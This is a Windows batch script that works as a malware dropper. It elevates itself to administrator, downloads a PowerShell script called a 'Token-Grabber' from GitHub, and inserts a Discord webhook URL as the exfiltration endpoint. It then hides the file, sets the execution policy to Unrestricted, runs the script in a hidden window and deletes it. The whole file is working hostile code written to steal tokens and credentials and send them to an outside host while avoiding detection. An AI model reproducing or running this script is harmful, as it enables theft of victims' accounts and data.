@echo off

net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
cd /d %~dp0

powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1130913257524306032/u7QScXshKBKUAY2X4shQwUHflAGaFPhnEPMGq5EC1nuz_UT-aGkwZjn5cJWvETEXnc57' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
attrib +h +s powershell123.ps1
powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
powershell -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
attrib -h -s powershell123.ps1
del powershell123.ps1 /f /q
timeout 3 > nul
exit
